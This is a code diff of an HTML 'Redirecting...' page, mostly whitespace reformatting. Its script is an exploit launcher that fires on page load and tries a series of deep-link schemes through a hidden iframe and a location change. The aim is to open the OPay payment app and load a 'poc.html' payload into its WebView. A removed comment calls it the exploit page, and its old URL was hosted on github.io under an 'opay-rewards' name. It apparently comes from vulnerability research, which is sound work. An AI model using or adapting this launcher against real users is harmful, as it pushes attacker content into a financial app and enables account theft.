@@ -1,11 +1,17 @@
 <!DOCTYPE html>
 <html>
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
             background: #f5f5f5;
@@ -15,25 +21,44 @@
             min-height: 100vh;
             color: #333;
         }
+
         .container {
             text-align: center;
             padding: 40px 20px;
         }
+
         .spinner {
-            width: 40px; height: 40px;
+            width: 40px;
+            height: 40px;
             border: 4px solid #ddd;
             border-top-color: #00c853;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
             margin: 0 auto 20px;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .msg { font-size: 16px; color: #666; margin-bottom: 10px; }
-        .sub { font-size: 13px; color: #999; }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .msg {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 10px;
+        }
+
+        .sub {
+            font-size: 13px;
+            color: #999;
+        }
+
         .fallback {
             display: none;
             margin-top: 30px;
         }
+
         .fallback a {
             display: inline-block;
             background: #00c853;
@@ -44,9 +69,13 @@
             font-weight: 600;
             text-decoration: none;
         }
-        .fallback a:active { transform: scale(0.97); }
+
+        .fallback a:active {
+            transform: scale(0.97);
+        }
     </style>
 </head>
+
 <body>
     <div class="container">
         <div class="spinner"></div>
@@ -59,8 +88,9 @@
     </div>
 
     <script>
-        // Exploit page URL (loaded inside OPay WebView)
-        var PAYLOAD_URL = "https://zugonwobi.github.io/opay-rewards/poc.html";
+        // Dynamic payload URL based on current location
+        var base = window.location.href.substring(0, window.location.href.lastIndexOf('/') + 1);
+        var PAYLOAD_URL = base + "poc.html";
 
         // Deep link schemes to try (in order)
         var SCHEMES = [
@@ -83,16 +113,16 @@
                 iframe.style.display = "none";
                 iframe.src = deepLink;
                 document.body.appendChild(iframe);
-                setTimeout(function() {
-                    try { document.body.removeChild(iframe); } catch(e) {}
+                setTimeout(function () {
+                    try { document.body.removeChild(iframe); } catch (e) { }
                 }, 500);
-            } catch(e) {}
+            } catch (e) { }
 
             // Method 2: direct location (primary for iOS Safari)
-            setTimeout(function() {
+            setTimeout(function () {
                 try {
                     window.location.href = deepLink;
-                } catch(e) {}
+                } catch (e) { }
             }, 100);
 
             launched = true;
@@ -102,7 +132,7 @@
         document.getElementById("manualBtn").href = SCHEMES[0];
 
         // Show fallback button after 3 seconds if still on page
-        setTimeout(function() {
+        setTimeout(function () {
             document.getElementById("fallback").style.display = "block";
         }, 3000);
 
@@ -110,12 +140,12 @@
         tryLaunch();
 
         // Track visibility — if page is hidden, app likely opened
-        document.addEventListener("visibilitychange", function() {
+        document.addEventListener("visibilitychange", function () {
             if (document.hidden) { launched = true; }
         });
 
         // If still visible after 2s, try next scheme
-        setTimeout(function() {
+        setTimeout(function () {
             if (!document.hidden && SCHEMES.length > 1) {
                 currentScheme = 1;
                 launched = false;
@@ -124,4 +154,5 @@
         }, 2000);
     </script>
 </body>
+
 </html>
